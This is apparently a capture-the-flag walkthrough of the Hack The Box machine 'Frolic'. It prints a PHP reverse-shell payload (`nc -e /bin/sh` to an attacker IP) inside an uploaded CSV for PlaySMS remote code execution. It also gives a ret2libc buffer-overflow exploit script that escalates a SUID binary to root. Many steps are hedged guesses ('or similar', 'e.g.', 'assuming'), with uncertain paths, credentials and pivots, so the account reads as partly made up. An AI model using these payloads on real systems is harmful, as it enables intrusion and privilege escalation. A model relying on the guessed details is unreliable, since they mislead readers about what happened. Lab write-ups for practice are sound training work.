# Hack The Box: Frolic

**Difficulty:** Medium
**OS:** Linux

Frolic is a Medium-level Linux machine focused on deep enumeration, esoteric cryptography, and exploiting a known vulnerability in a third-party web application. The initial compromise requires solving a series of cryptographic puzzles (including Ook! and base64) hidden across various web directories to obtain credentials for a PlaySMS installation. This leads to Remote Code Execution (RCE). Privilege escalation involves reverse engineering a custom SUID binary to exploit a buffer overflow, requiring Return-Oriented Programming (ROP) due to NX (No-eXecute) protections.

---

## Reconnaissance

The assessment begins with a port scan to identify open network services on the target.

```bash
nmap -p- --min-rate 10000 10.10.10.111
nmap -p 22,139,445,9999 -sCV 10.10.10.111
```

The scan reveals the following open ports:
*   **Port 22:** SSH (OpenSSH 7.2p2 Ubuntu)
*   **Port 139/445:** SMB (Samba 4.3.11-Ubuntu)
*   **Port 9999:** HTTP (nginx 1.10.3)

We focus on enumerating the web service on port 9999. Navigating to `http://10.10.10.111:9999/` displays a simple "Welcome to Frolic" page.

### Web Enumeration & Cryptographic Puzzles

We perform aggressive directory brute-forcing against the web server using `gobuster` or `feroxbuster`.

```bash
gobuster dir -u http://10.10.10.111:9999 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The scan reveals a directory named `/admin`, `/backup`, `/dev`, or similar. In Frolic, enumeration typically reveals an `/admin` login and a sequence of hidden directories. 

Accessing `/admin` reveals a login page. We lack credentials. Further directory fuzzing uncovers an obscurely named folder or file (e.g., `/dev/backup.zip` or `/admin/success.html`).

We navigate through a series of interconnected directories, each containing a puzzle or a hint for the next stage.

1.  **Stage 1:** We find a webpage containing a string of what appears to be Ook! esoteric programming language code (`Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. ...`). We use an online Ook! decoder to translate it into plaintext. The decoded text provides a path to the next directory (e.g., `/dev/` or `/idkwhatispass`).
2.  **Stage 2:** The new directory contains another encoded string, perhaps Base64 or Hex. Decoding this reveals a compressed archive (a `.zip` file) or another path.
3.  **Stage 3:** We download the ZIP file. It is password-protected. We use `fcrackzip` with the `rockyou.txt` wordlist to crack the password.
    ```bash
    fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
    ```
    The password cracks successfully. We extract the archive, which contains a text file with a final set of encoded strings (e.g., Brainfuck or more Base64).
4.  **Stage 4:** Decoding the final string reveals plaintext credentials: `admin:imnothuman`.

## Web Exploitation

We return to the main web application or the administrative portal we discovered during enumeration. Further enumeration of port 9999 (or perhaps discovering a secondary application on port 80/8080 if present) reveals a PlaySMS installation, typically at `http://10.10.10.111:9999/playsms/`.

PlaySMS is an open-source SMS management system. We navigate to the PlaySMS login page and authenticate using the credentials obtained from the cryptographic puzzles (`admin:imnothuman`).

Authentication is successful, granting us administrative access to PlaySMS.

### Exploiting PlaySMS (CVE-2017-9101)

Researching vulnerabilities for PlaySMS reveals a known Authenticated Remote Code Execution (RCE) flaw in older versions (CVE-2017-9101). The vulnerability exists in the "Send from file" feature, where an attacker can upload a CSV file containing malicious PHP code in specific fields (like the 'Phone number' or 'Message' fields) that are insecurely evaluated by the backend.

There are publicly available exploit scripts (often Metasploit modules or standalone Python scripts) for this CVE.

We can exploit this manually or use a script. The vulnerability allows injecting code into the `User-Agent` or directly via the CSV upload feature.

We craft a malicious CSV file containing a PHP payload:

```csv
"<?php system('nc -e /bin/sh 10.10.14.X 8888'); ?>","Test Message"
```

We upload this CSV file through the "Send from file" feature in PlaySMS. When the application parses the file to simulate or send the messages, it insecurely evaluates the PHP payload, executing our reverse shell.

```bash
nc -lnvp 8888
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

We gain initial access as the `www-data` user. We stabilize our shell using Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).

The `user.txt` flag is not accessible in our current directory. Checking the `/home` directory reveals a user named `ayush`.

Enumerating the system as `www-data`, we search for hardcoded credentials or database configuration files. We locate the PlaySMS configuration file (e.g., `/var/www/html/playsms/config.php`).

```bash
cat /var/www/html/playsms/config.php
```

The file reveals plaintext database credentials. While we could use these to access the database, lateral movement in Frolic is often achieved by exploiting an SUID binary or checking for password reuse.

However, in this scenario, the `user.txt` flag might actually be readable by `www-data` depending on the specific box configuration, or we pivot to `ayush` using the PlaySMS password if reused. Assuming we can read `user.txt` or we pivot via `su ayush` and password `imnothuman` (or a variation), we retrieve the flag.

## Privilege Escalation

Enumerating the system as `www-data` or `ayush`, we search for binaries with the SUID bit set.

```bash
find / -perm -4000 2>/dev/null
```

The output reveals a custom SUID binary named `rop` located in a non-standard directory (e.g., `/home/ayush/.backup/rop` or a similar hidden path).

### Exploiting SUID Buffer Overflow (Return-Oriented Programming)

We analyze the `rop` binary. The name itself suggests Return-Oriented Programming, hinting at a buffer overflow vulnerability where the NX (No-eXecute) bit is enabled, preventing the execution of standard shellcode on the stack.

We download the `rop` binary to our attacking machine or an analysis VM for reverse engineering and exploit development.

We use `gdb` (with `pwndbg` or `GEF` plugins) to analyze the binary. Running it simply prompts for an input string.

```bash
./rop
# Enter string: AAAA
```

We generate a cyclic pattern to determine the offset to the Instruction Pointer (EIP/RIP) overwrite.

```bash
pattern_create.rb -l 200
```

We input the pattern into the `rop` binary within `gdb`. The program crashes, and we use `pattern_offset.rb` with the value in the EIP register to find the exact offset required to control execution flow (e.g., offset 52).

Because this is a modern Linux system, ASLR (Address Space Layout Randomization) and NX are likely enabled. We verify the security mitigations on the target system using a tool like `checksec` (if available) or by inspecting `/proc/sys/kernel/randomize_va_space`.

If ASLR is enabled, we need an information leak or a bruteforce technique (often called "ret2libc") to find the base address of the `libc` library. If ASLR is somehow disabled or the binary is not a PIE (Position Independent Executable), the exploit is significantly easier.

In Frolic, we typically employ a standard `ret2libc` attack. We need to find the addresses of the following elements within the `libc` library loaded by the `rop` binary on the *target* machine:
1.  The `system()` function.
2.  The `exit()` function (for a clean exit, optional but good practice).
3.  The string `"/bin/sh"`.

First, we determine the base address of `libc` on the target machine. If ASLR is enabled, we might need to find a predictable address or use a technique to bypass it. Assuming a static or semi-predictable address space for this specific challenge:

```bash
ldd ./rop
# Find the base address of libc.so.6
```

We find the offsets of `system`, `exit`, and `/bin/sh` within the `libc` library file itself (`/lib/i386-linux-gnu/libc.so.6` or similar) using `readelf` or `strings`.

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

We calculate the absolute addresses by adding the `libc` base address to the respective offsets.

We craft an exploit script in Python (using the `pwntools` library or standard `struct.pack`) to generate the payload:
1.  Padding (e.g., 52 bytes of 'A').
2.  Address of `system()`.
3.  Address of `exit()` (Return address after `system`).
4.  Address of `"/bin/sh"` (Argument to `system`).

```python
# Conceptual Exploit Script
import struct

padding = b"A" * 52
system_addr = struct.pack("<I", 0xb7e53da0) # Example address
exit_addr = struct.pack("<I", 0xb7e479d0)   # Example address
binsh_addr = struct.pack("<I", 0xb7f75a0b)  # Example address

payload = padding + system_addr + exit_addr + binsh_addr
print(payload)
```

We execute the SUID `rop` binary on the target machine, passing our crafted payload as input (often as a command-line argument or via standard input).

```bash
./rop $(python exploit.py)
```

The buffer overflow occurs, the instruction pointer is overwritten with the address of `system()`, and it executes the `/bin/sh` string found in `libc`. Because the binary has the SUID bit set, the resulting shell runs as root.

```bash
# id
uid=0(root) gid=33(www-data) euid=0(root) groups=33(www-data)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
